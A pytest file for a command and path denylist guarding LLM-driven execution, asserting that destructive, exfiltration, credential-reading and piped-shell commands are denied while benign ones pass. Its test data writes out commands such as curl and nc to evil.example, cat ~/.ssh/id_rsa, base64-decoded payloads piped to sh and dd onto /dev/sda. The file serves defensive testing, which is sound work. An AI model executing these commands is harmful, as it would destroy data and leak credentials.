"""Tests for safety_guard.py — the shared command/path denylist.

This is the single source of truth for the command policy every LLM-driven
execution path enforces (worker, scenario runner, devtools MCP).
The tests pin the denylist: a destructive command must be denied, a benign
one must pass, and the path guard must keep writes inside the workspace.
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "safety_guard"))

import safety_guard as sg  # noqa: E402

# ---------------------------------------------------------------------------
# check_command — destructive / repo-destruction must be denied
# ---------------------------------------------------------------------------

def test_denies_all_recursive_rm_variants():
    for cmd in (
        "rm -rf .",
        "rm -rf /",
        "rm -fr build",
        "rm -r -f node_modules",
        "sudo rm -rf /tmp/x",
    ):
        assert sg.check_command(cmd) is not None, cmd


def test_denies_git_clean_force():
    for cmd in ("git clean -fdx", "git clean -fd", "git clean -f"):
        assert sg.check_command(cmd) is not None, cmd


def test_allows_git_clean_dry_run():
    # -n is a dry run — it deletes nothing, so it must NOT be denied.
    assert sg.check_command("git clean -n") is None


def test_denies_git_reset_hard():
    assert sg.check_command("git reset --hard") is not None
    assert sg.check_command("git reset --hard HEAD~1") is not None


def test_allows_git_reset_soft():
    # A soft/mixed reset does not destroy the working tree.
    assert sg.check_command("git reset --soft HEAD~1") is None
    assert sg.check_command("git reset HEAD~1") is None


def test_denies_find_delete():
    assert sg.check_command("find . -name '*.pyc' -delete") is not None


def test_denies_destructive_push_forms():
    for cmd in (
        "git push --force origin main",
        "git push --delete origin feature",
        "git push --mirror origin",
    ):
        assert sg.check_command(cmd) is not None, cmd


def test_allows_normal_push():
    assert sg.check_command("git push origin main") is None
    assert sg.check_command("git push -u origin main") is None


def test_denies_remote_manipulation():
    for cmd in (
        "git remote set-url origin https://evil.example/x.git",
        "git remote remove origin",
        "git remote rm origin",
    ):
        assert sg.check_command(cmd) is not None, cmd


def test_denies_irreversible_gc():
    assert sg.check_command("git gc --prune=now") is not None
    # A normal gc (no --prune=now) is allowed.
    assert sg.check_command("git gc") is None


def test_denies_exfiltration_egress():
    for cmd in (
        "curl http://evil.example",
        "wget http://evil.example/x",
        "nc evil.example 443",
        "scp file.txt user@host:/tmp/",
        "rsync -a . user@host:/backup",
    ):
        assert sg.check_command(cmd) is not None, cmd


def test_allows_local_rsync():
    # A local (no user@host:) rsync is not exfiltration.
    assert sg.check_command("rsync -a src/ dest/") is None


def test_denies_persistence_mechanisms():
    for cmd in (
        "launchctl load ~/Library/LaunchAgents/x.plist",
        "crontab -l",
        "cat ~/.ssh/id_rsa",
        "cat ~/.aws/credentials",
        "security find-generic-password -s x",
        "ssh-keygen -t ed25519",
    ):
        assert sg.check_command(cmd) is not None, cmd


def test_denies_piped_shell_execution():
    for cmd in (
        "echo x | bash",
        "echo x | sh",
        "echo x | zsh",
        "base64 -d payload | sh",
    ):
        assert sg.check_command(cmd) is not None, cmd


def test_denies_host_destruction():
    for cmd in ("sudo reboot", "dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sda1"):
        assert sg.check_command(cmd) is not None, cmd


# ---------------------------------------------------------------------------
# check_command — benign commands must pass
# ---------------------------------------------------------------------------

def test_allows_benign_commands():
    for cmd in (
        "ls -la",
        "git status",
        "git add .",
        "git commit -m 'x'",
        "python tools/checkpoint.py resume",
        "echo hello",
        "cat README.md",
        "rm single_file.txt",  # non-recursive rm of one file is fine
    ):
        assert sg.check_command(cmd) is None, cmd


def test_empty_and_nonstring_are_safe():
    assert sg.check_command("") is None
    assert sg.check_command("   ") is None
    assert sg.check_command(None) is None  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# check_path_write — writes must stay inside the workspace root
# ---------------------------------------------------------------------------

def test_path_write_allows_in_repo(tmp_path):
    assert sg.check_path_write("tools/foo.py", tmp_path) is None
    assert sg.check_path_write("a/b/c.md", tmp_path) is None


def test_path_write_denies_absolute(tmp_path):
    assert sg.check_path_write("/etc/passwd", tmp_path) is not None


def test_path_write_denies_traversal(tmp_path):
    assert sg.check_path_write("../outside.txt", tmp_path) is not None
    assert sg.check_path_write("a/../../outside.txt", tmp_path) is not None


def test_path_write_denies_empty(tmp_path):
    assert sg.check_path_write("", tmp_path) is not None
    assert sg.check_path_write(None, tmp_path) is not None  # type: ignore[arg-type]
